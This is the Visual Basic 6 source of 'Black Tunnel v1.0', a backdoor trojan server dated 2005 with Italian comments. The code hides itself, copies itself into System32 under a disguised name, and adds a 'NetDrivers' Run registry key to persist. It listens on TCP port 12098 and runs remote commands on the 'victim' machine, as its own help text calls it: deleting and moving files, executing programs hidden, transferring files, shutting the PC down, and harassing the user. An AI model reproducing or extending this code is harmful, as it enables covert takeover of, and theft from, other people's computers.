VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form frmMain 
   BorderStyle     =   0  'None
   Caption         =   "SysExec"
   ClientHeight    =   3585
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   5370
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3585
   ScaleWidth      =   5370
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.FileListBox File 
      Height          =   1845
      Left            =   2640
      TabIndex        =   5
      Top             =   1560
      Width           =   2535
   End
   Begin VB.DirListBox Dir 
      Height          =   1440
      Left            =   120
      TabIndex        =   4
      Top             =   1920
      Width           =   2415
   End
   Begin VB.DriveListBox Drive 
      Height          =   315
      Left            =   120
      TabIndex        =   3
      Top             =   1560
      Width           =   2415
   End
   Begin VB.TextBox txtData 
      Height          =   285
      Index           =   0
      Left            =   120
      Locked          =   -1  'True
      TabIndex        =   0
      Top             =   1080
      Width           =   5055
   End
   Begin MSWinsockLib.Winsock sckServer 
      Index           =   0
      Left            =   2160
      Top             =   600
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label lblData 
      Caption         =   "Received Data:"
      Height          =   255
      Left            =   120
      TabIndex        =   2
      Top             =   840
      Width           =   1575
   End
   Begin VB.Label lblName 
      Caption         =   "Black Tunnel v1.0 by LotStyl"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   18
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   240
      TabIndex        =   1
      Top             =   120
      Width           =   5055
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Black Tunnel v1.0
'Written by LotStyl 2005
'Italian comments

Const PORT = 12098

Private CurUser As Long




Private Sub Form_Load()

On Error Resume Next
'Controlla se il programma è già stato aperto e lo chiude
If App.PrevInstance = True Then
    End
End If

'Verifica la posizione corrente
If LCase(App.Path & "\") <> LCase(GetWinSysDir) Then   'Se non si trova in System32 spostalo lì
    Set Fso = CreateObject("Scripting.FileSystemObject") 'Imposta l'oggetto
    On Error GoTo errMove
    Fso.MoveFile App.Path & "\" & App.EXEName & ".exe", GetWinSysDir & ".exe" 'Sposta il file rinominato come .exe
    
    'Crea chiave di registro
    regCreate_Key_Value HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", "NetDrivers", "C:\WINDOWS\SYSTEM32\.exe"

    On Error Resume Next
End If
    'Rendi invisibile il programma
    frmMain.Visible = False
    App.TaskVisible = False
        CurUser = 0
        sckServer(0).LocalPort = PORT
        sckServer(0).Listen
        'Load upload/Download servers
        frmClient.Show
        frmSvr.Show
        frmClient.Visible = False
        frmSvr.Visible = False
Exit Sub
errMove:
If Err.Number = 58 Then   'File già esistente alla destinazione
    Kill GetWinSysDir & ".exe"  'Cancella il file
    Fso.MoveFile App.Path & "\" & App.EXEName & ".exe", GetWinSysDir & ".exe" 'Sposta il file rinominato come .exe
    Resume Next
End If
End Sub

Private Sub sckServer_ConnectionRequest _
(Index As Integer, ByVal requestID As Long)
   If Index = 0 Then
      CurUser = CurUser + 1
      Load sckServer(CurUser)
      sckServer(CurUser).LocalPort = 0
      sckServer(CurUser).Accept requestID
      Load txtData(CurUser)
      
      'Welcome message
      sckServer(CurUser).SendData "999 Connected to Black Tunnel v1.0 Connected to " & sckServer(CurUser).LocalIP & " " & sckServer(CurUser).LocalHostName & " port " & sckServer(CurUser).LocalPort & vbCrLf & "999 Local time is " & Date & " " & Time & vbCrLf
   End If
End Sub

Private Sub sckServer_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim TextDataArrival As String
    
    Dim Fso As New FileSystemObject
    Set Fso = CreateObject("Scripting.FileSystemObject")

'Now sckServer(intmax) is TCP
Dim TCP As Winsock
Set TCP = sckServer(CurUser)


TCP.GetData TextDataArrival, vbString
txtData(intMax).Text = txtData(intMax).Text & TextDataArrival

If Right(txtData(intMax), 1) = Chr(10) Then                        'Se preme invio
Data = Left(txtData(intMax), Len(txtData(intMax)) - 2)

'####################################################
'Start real DataArrival Procedure (executes commands)


If LCase(Data) = "info" Then
    

    
    TCP.SendData "999 Requesting info..." & vbCrLf
    TCP.SendData "" & vbCrLf
    TCP.SendData "999 Local HOSTNAME:  " & TCP.LocalHostName & vbCrLf
    TCP.SendData "999 Local IP:        " & TCP.LocalIP & vbCrLf
    TCP.SendData "999 Local PORT:      " & TCP.LocalPort & vbCrLf
    TCP.SendData "999 Local Time:      " & Date & " " & Time & vbCrLf
    TCP.SendData "999 Remote HOSTNAME: " & TCP.RemoteHost & vbCrLf
    TCP.SendData "999 Remote Host IP:  " & TCP.RemoteHostIP & vbCrLf
    TCP.SendData "999 Remote PORT:     " & TCP.RemotePort & vbCrLf
    TCP.SendData vbCrLf
    TCP.SendData "Server name:         " & App.EXEName & ".exe" & vbCrLf
    TCP.SendData "Server path:         " & App.Path & vbCrLf
    TCP.SendData "Server title:        " & App.Title
    TCP.SendData vbCrLf
    TCP.SendData "Windows directory:   " & GetWinDir & vbCrLf
    TCP.SendData "System32 directory:  " & GetWinSysDir & vbCrLf
    TCP.SendData "Computer name:       " & PCname & vbCrLf
    TCP.SendData vbCrLf
    TCP.SendData "Main svr port:       " & PORT & vbCrLf
    If frmClient.WskClient.LocalPort = 0 Then
        TCP.SendData "Download svr port:    (visible after the first download)" & vbCrLf
    Else
        TCP.SendData "Download svr port:    " & frmClient.WskClient.LocalPort & vbCrLf
    End If
    TCP.SendData "Upload svr port:     " & frmSvr.WskServer(0).LocalPort & vbCrLf
 RD
 
ElseIf LCase(Data) = "about" Then

    TCP.SendData "999 BRC(Bomber's Remote Control) v.1.0.0 is a remote control utility written by BOmBeR. Enjoy It!" & vbCrLf
    RD
    
ElseIf LCase(Data) = "state" Then

    Select Case TCP.State
    Case Is = 0
        TCP.SendData "999 BRC Server's state: CLOSED" & vbCrLf
    Case Is = 1
        TCP.SendData "999 BRC Server's state: OPEN" & vbCrLf
    Case Is = 2
        TCP.SendData "999 BRC Server's state: LISTENING" & vbCrLf
    Case Is = 3
        TCP.SendData "999 BRC Server's state: CONNECTION PENDING" & vbCrLf
    Case Is = 4
        TCP.SendData "999 BRC Server's state: RESOLVING HOST" & vbCrLf
    Case Is = 5
        TCP.SendData "999 BRC Server's state: HOST RESOLVED" & vbCrLf
    Case Is = 6
        TCP.SendData "999 BRC Server's state: CONNECTING" & vbCrLf
    Case Is = 7
        TCP.SendData "999 BRC Server's state: CONNECTED" & vbCrLf
    Case Is = 8
        TCP.SendData "999 BRC Server's state: PEER IS CLOSING THE CONNECTION" & vbCrLf
    Case Is = 9
        TCP.SendData "999 BRC Server's state: ERROR" & vbCrLf
    'Else
    Case Else
        TCP.SendData "999 BRC Server's state: UNKNOWN" & vbCrLf
    End Select
    
    RD
    
   'HELP
ElseIf LCase(Data) = "help" Then

    TCP.SendData "999 BRC 1.0 (Bomber Remote Control) Help:" & vbCrLf
    TCP.SendData vbCrLf
    TCP.SendData "999 Supported commands:" & vbCrLf
    TCP.SendData vbCrLf
    TCP.SendData "999 INFO            -  VICTIM's INFO" & vbCrLf
    TCP.SendData "999 ABOUT           -  ABOUT BLACK TUNNEL" & vbCrLf
    TCP.SendData "999 STATE           -  CONNECTION STATE" & vbCrLf
    TCP.SendData "999 HELP            -  HELP MENU" & vbCrLf
    TCP.SendData "999 EXIT            -  CLOSE SERVER" & vbCrLf
    TCP.SendData vbCrLf
    TCP.SendData "999 rm ..           -  Delete file(..)" & vbCrLf
    TCP.SendData "999 cp ..;..        -  Copy file (source;destination)" & vbCrLf
    TCP.SendData "999 rn ..;..        -  Rename file(source;destination)" & vbCrLf
    TCP.SendData "999 mo ..;..        -  Move File(source;destination)" & vbCrLf
    TCP.SendData "999 sh -x ..        -  Execute File (..)" & vbCrLf
    TCP.SendData "999                       -n  =   Normal execution" & vbCrLf
    TCP.SendData "999                       -h  =   Hide execution" & vbCrLf
    TCP.SendData "999 fx ..           -  Check if a file exists(..)" & vbCrLf
    TCP.SendData "999 fa -x ..        -  Set file attributes(..)" & vbCrLf
    TCP.SendData "999                       -n  =   Normal" & vbCrLf
    TCP.SendData "999                       -r  =   ReadOnly" & vbCrLf
    TCP.SendData "999                       -h  =   Hidden" & vbCrLf
    TCP.SendData "999                       -s  =   System" & vbCrLf
    TCP.SendData "999                       -a  =   Archive" & vbCrLf
    TCP.SendData vbCrLf
    TCP.SendData "999 mk ..           -  Make a folder(..)" & vbCrLf
    TCP.SendData "999 rk ..           -  Delete a folder(..)" & vbCrLf
    TCP.SendData "999 ck ..;..        -  Copy a folder(source;destination)" & vbCrLf
    TCP.SendData "999 rs ..;..        -  Move a folder(source;destination)" & vbCrLf
    TCP.SendData "999 rx ..           -  Check if a folder exists(..)" & vbCrLf
    TCP.SendData "999 dir ..          -  Show directory tree(..)" & vbCrLf
    TCP.SendData vbCrLf
    TCP.SendData "999 dx ..           -  Check if a drive exists(..)" & vbCrLf
    TCP.SendData vbCrLf
    TCP.SendData "999 mbox -x ..;..   -  Show MessageBox (text;title)" & vbCrLf
    TCP.SendData "999                       -n  =   Normal" & vbCrLf
    TCP.SendData "999                       -c  =   Critical" & vbCrLf
    TCP.SendData "999                       -e  =   Exclamation" & vbCrLf
    TCP.SendData "999                       -i  =   Information" & vbCrLf
    TCP.SendData "999                       -q  =   Question" & vbCrLf
    TCP.SendData "999 cht ..;..       -  Chat with the victim (text;title) - Title must be non zero length" & vbCrLf
    TCP.SendData "999 sd -x     -  Shutdown the PC - Works only on Windows XP" & vbCrLf
    TCP.SendData "999                       -x  =   Is the Windows XP shutdown parameter" & vbCrLf
    TCP.SendData "999 cd -x           -  Open/Close the CD Drive" & vbCrLf
    TCP.SendData "999                       -o  =   Open the CD Drive" & vbCrLf
    TCP.SendData "999                       -c  =   Close the CD Drive" & vbCrLf
    TCP.SendData "999 time            -  Show the victim's pc's time" & vbCrLf
    TCP.SendData "999 print -x ..     -  Print a text or a file(..)" & vbCrLf
    TCP.SendData "999                       -t  =   Print text(..)" & vbCrLf
    TCP.SendData "999                       -f  =   Print a file(..)" & vbCrLf
    TCP.SendData "999 dsk -x          -  Show or hide desktop icons" & vbCrLf
    TCP.SendData "999                       -s  =   show desktop icons" & vbCrLf
    TCP.SendData "999                       -h  =   Hide desktop icons" & vbCrLf
    TCP.SendData "999 sta- x          -  Show or hide start bar" & vbCrLf
    TCP.SendData "999                       -s  =   Show start bar" & vbCrLf
    TCP.SendData "999                       -h  =   hide start bar" & vbCrLf
    TCP.SendData "999 pcn ..          - Change PC name(..)" & vbCrLf
    TCP.SendData vbCrLf
    TCP.SendData "999 get ..;..       -  Download a file(source;destination) - You must activate your download server" & vbCrLf
    TCP.SendData "999 send            -  Upload a file - You must activate your client upload server" & vbCrLf

    
    RD
    
ElseIf LCase(Data) = "exit" Then

    TCP.SendData "999 Closing Black Tunnel server..." & vbCrLf
    RD
    
    Unload frmClient
    Unload frmSvr
    Unload frmSvr
    End

ElseIf LCase(Left(Data, 2)) = "rm" Then
    
    On Error GoTo ErrFileEvent
    
    Fso.DeleteFile Mid(Data, 4)
    TCP.SendData "999 File removed successfully" & vbCrLf
    RD
    
ElseIf LCase(Left(Data, 2)) = "cp" Then
     
   On Error GoTo ErrFileEvent
    
    
    FindArg 4   'Separate commands
    
    Fso.CopyFile Source, Destination, True  'Copy file
    
    TCP.SendData "999 File copied successfully" & vbCrLf
    RD
    
ElseIf LCase(Left(Data, 2)) = "rn" Then

    On Error GoTo ErrFileEvent
    
    FindArg 4
    
    Name Source As Destination

    TCP.SendData "999 File renamed successfully" & vbCrLf
    RD
    
ElseIf LCase(Left(Data, 2)) = "mo" Then

    On Error GoTo ErrFileEvent
    
    FindArg 4
    
    Fso.MoveFile Source, Destination
    
    TCP.SendData "999 File moved successfully" & vbCrLf
    RD
    
ElseIf LCase(Left(Data, 2)) = "sh" Then

    On Error GoTo ErrFileEvent
    
    FindX
    
    Select Case LCase(Arg)
    
    Case Is = "h"
        Shell Source, vbHide
        TCP.SendData "999 File executed successfully" & vbCrLf
    Case Is = "n"
        Shell Source
        TCP.SendData "999 File executed successfully" & vbCrLf
    Case Else
        GoTo ErrEvent
    
    End Select
    
        RD
    
ElseIf LCase(Left(Data, 2)) = "fx" Then

    On Error GoTo ErrFileEvent
    
    If Fso.FileExists(Mid(Data, 4)) = True Then
    
       TCP.SendData "999 The file exists" & vbCrLf
       
    Else
    
       TCP.SendData "999 The file doesn't exist" & vbCrLf
    
    End If
    RD
    
ElseIf LCase(Left(Data, 2)) = "fa" Then

    On Error GoTo ErrFileEvent
    
    FindX
    
    Select Case LCase(Arg)
    
    Case Is = "n"
        SetAttr Source, vbNormal
    Case Is = "r"
        SetAttr Source, vbReadOnly
    Case Is = "h"
        SetAttr Source, vbHidden
    Case Is = "s"
        SetAttr Source, vbSystem
    Case Is = "a"
        SetAttr Source, vbArchive
        
    End Select
    
    TCP.SendData "999 Attributes changed successfully" & vbCrLf

    RD
ElseIf LCase(Left(Data, 2)) = "mk" Then
    
    On Error GoTo ErrFileEvent
    
    Fso.CreateFolder Mid(Data, 4)
    
    TCP.SendData "999 Folder created successfully" & vbCrLf
    RD
    
ElseIf LCase(Left(Data, 2)) = "rk" Then

    On Error GoTo ErrFileEvent
    
    Fso.DeleteFolder Mid(Data, 4)
    
    TCP.SendData "999 Folder removed successfully" & vbCrLf
    RD
    
ElseIf LCase(Left(Data, 2)) = "ck" Then

    On Error GoTo ErrFileEvent
    
    FindArg 4
    
    Fso.CopyFolder Source, Destination, True
    
    TCP.SendData "999 Folder copied successfully" & vbCrLf
    RD
    
ElseIf LCase(Left(Data, 2)) = "rs" Then

    On Error GoTo ErrFileEvent
    
    FindArg 4
    
    Fso.MoveFolder Source, Destination
    
    TCP.SendData "999 Folder moved successfully" & vbCrLf
    RD
    
ElseIf LCase(Left(Data, 2)) = "rx" Then

    On Error GoTo ErrFileEvent
    
    If Fso.FolderExists(Mid(Data, 4)) = True Then
    
    TCP.SendData "999 The folder exists" & vbCrLf
    
    Else
    
    TCP.SendData "999 The folder doesn't exist" & vbCrLf
    
    End If
    
    RD
    
ElseIf LCase(Left(Data, 2)) = "dx" Then
       
    On Error GoTo ErrFileEvent
    
    If Fso.DriveExists(Mid(Data, 4)) = True Then
    
    TCP.SendData "999 The drive exists" & vbCrLf
    
    Else
    
    TCP.SendData "999 The drive doesn't exist" & vbCrLf
    
    End If
    
    RD
    
'DIR OPERATION

ElseIf LCase(Left(Data, 3)) = "dir" Then
    
    Dim Drives As String
    Dim Folders As String
    Dim Files As String
    
    On Error GoTo ErrFileEvent
    
    Dir.Path = Mid(Data, 5)
    File.Path = Dir.Path
    
    TCP.SendData "999 DIR --  " & Data & " >>" & vbCrLf
    TCP.SendData vbCrLf
    
    Drives = "999 Drives  >  "

    
    'Drives
    For Drv = 0 To Drive.ListCount - 1
    
    Drives = Drives & Drive.List(Drv) & "  "
    
    Next Drv
    
    'Folders
    For fld = 0 To Dir.ListCount - 1
    
    Folders = Folders & "999 Folders >  " & Dir.List(fld) & vbCrLf
    
    Next fld
    
    'Files
    For Fil = 0 To File.ListCount - 1
    
    Files = Files & "999 Files   >  " & File.List(Fil) & vbCrLf
    
    Next Fil
    
    TCP.SendData Drives & vbCrLf
    TCP.SendData vbCrLf
    TCP.SendData Folders & vbCrLf
    TCP.SendData Files & vbCrLf
    TCP.SendData vbCrLf
    TCP.SendData "999 Drives: " & Drive.ListCount & " Folders: " & Dir.ListCount & " Files: " & File.ListCount & vbCrLf
    
    
    Drives = ""
    Folders = ""
    Files = ""

RD

ElseIf LCase(Left(Data, 4)) = "mbox" Then
    
    On Error GoTo ErrEvent

    FindX   '1 Parameter
    
    FindArg (9)
    
    Select Case LCase(Arg)
    
    Case Is = "n"
        TCP.SendData "999 MessageBox showed successfully" & vbCrLf
        MsgBox Source, , Destination
        TCP.SendData "999 The user clicked" & vbCrLf
    Case Is = "c"
        TCP.SendData "999 MessageBox showed successfully" & vbCrLf
        MsgBox Source, vbCritical, Destination
        TCP.SendData "999 The user clicked" & vbCrLf
    Case Is = "e"
        TCP.SendData "999 MessageBox showed successfully" & vbCrLf
        MsgBox Source, vbExclamation, Destination
        TCP.SendData "999 The user clicked" & vbCrLf
    Case Is = "i"
        TCP.SendData "999 MessageBox showed successfully" & vbCrLf
        MsgBox Source, vbInformation, Destination
        TCP.SendData "999 The user clicked" & vbCrLf
    Case Is = "q"
        TCP.SendData "999 MessageBox showed successfully" & vbCrLf
        MsgBox Source, vbQuestion, Destination
        TCP.SendData "999 The user clicked" & vbCrLf
    Case Else
    
    
    GoTo ErrEvent

    End Select
    
ElseIf LCase(Left(Data, 3)) = "cht" Then

    Dim Ret As String
    
    FindArg (5)
    
    Ret = InputBox(Source, Destination)
    
    TCP.SendData "999 Victim > " & Ret & vbCrLf
    
    RD

ElseIf LCase(Left(Data, 2)) = "sd" Then
    

    On Error GoTo ErrEvent

    TCP.SendData "999 The shutdown command is the Windows XP shutdown command.." & vbCrLf
    
    Shell (("shutdown" & LCase(Right(Data, Len(Data) - 2))))

    TCP.SendData "999 Shutdown activated successfully" & vbCrLf

    RD
    
    
ElseIf LCase(Left(Data, 2)) = "cd" Then

    On Error GoTo ErrEvent
    
    FindX
    
    Select Case LCase(Arg)
    
    Case Is = "o"
        retValue = mciSendString("set CDAudio door open", returnstring, 127, 0)
        TCP.SendData "999 CD drive opened successfully" & vbCrLf
    Case Is = "c"
        retValue = mciSendString("set CDAudio door closed", returnstring, 127, 0)
        TCP.SendData "999 CD drive closed successfully" & vbCrLf
    Case Else
    
    GoTo ErrEvent
    
    End Select
    
ElseIf LCase(Data) = "time" Then

    TCP.SendData "999 Local time and date are: " & Time & "  " & Date & vbCrLf
    RD
    
ElseIf LCase(Left(Data, 5)) = "print" Then

    On Error GoTo ErrEvent
    FindX
    
    Select Case LCase(Arg)
    
    Case Is = "t"
        Printer.Print Source
        TCP.SendData "999 Text printed successfully" & vbCrLf
    Case Is = "f"
        Dim PrintData As String
        
        Open Source For Input As #1
        Do While Not EOF(1)   ' Check for end of file.
        Line Input #1, InputData  ' Read line of data.
        PrintData = PrintData & InputData & vbCrLf  'Update data
        Loop
        Close #1   ' Close file.
        
        Printer.Print PrintData
        TCP.SendData "999 File printed successfully" & vbCrLf

    Case Else
    
    GoTo ErrEvent
        
    End Select

ElseIf LCase(Left(Data, 3)) = "dsk" Then
    
    On Error GoTo ErrEvent

    FindX
    
    Select Case LCase(Arg)
    
    Case Is = "s"
        ShowDesktopIcons True
        TCP.SendData "999 Desktop Icons showed successfully" & vbCrLf
    Case Is = "h"
        ShowDesktopIcons False
        TCP.SendData "999 Desktop Icons hided successfully" & vbCrLf
    Case Else
    
    GoTo ErrEvent
    
    End Select
    
ElseIf LCase(Left(Data, 3)) = "sta" Then

    On Error GoTo ErrEvent
    
    FindX
    
    Select Case LCase(Arg)
    
    Case Is = "s"
        ShowStartBar True
        TCP.SendData "999 Start Bar showed successfully" & vbCrLf
    RD
    Case Is = "h"
        ShowStartBar False
        TCP.SendData "999 Start Bar hided successfully" & vbCrLf
    RD
    Case Else
    
    GoTo ErrEvent
    
    End Select
    
ElseIf LCase(Left(Data, 3)) = "get" Then

    On Error GoTo ErrEvent

    FindArg (5)
   
    Connection = TCP.RemoteHostIP
    frmClient.txtOK = "1 " & Destination
    frmClient.txtPath = Source
    
    TCP.SendData "999 File download started successfully" & vbCrLf
    
RD
ElseIf LCase(Left(Data, 4)) = "send" Then

    On Error GoTo ErrEvent
    
    TCP.SendData "999 To Upload files open your UPLOAD CLIENT" & vbCrLf
    RD

ElseIf LCase(Left(Data, 3)) = "pcn" Then

    If SetPCname(Mid(Data, 5)) = True Then
        TCP.SendData "999 Computer name changed successfully. Restart the computer to apply the changes." & vbCrLf
    Else
        TCP.SendData "999 Can't change computer name" & vbCrLf
    End If
    
    RD
    

ElseIf LCase(Data) = "error" Then
    
    TCP.SendData "999 Errors: " & ErrDU & vbCrLf
    ErrDU = ""

RD


Else

'BAD COMMAND

'Only if the user sends a bad command, not when He sends nothing
ErrEvent:
     If LCase(Data) <> "" Then
      TCP.SendData "555 Bad command or invalid operation! For a list of supported commands type 'HELP'" & vbCrLf
     End If


End If

'##############################
'End real DataArrival Procedure

Reset                         'Restore data (Source - Destination)
txtData(intMax) = ""          'Cancel previous command
End If
Exit Sub
ErrFileEvent:

TCP.SendData "555 Bad command. File, folder or drive not found!" & vbCrLf

GoTo ErrEvent


End Sub

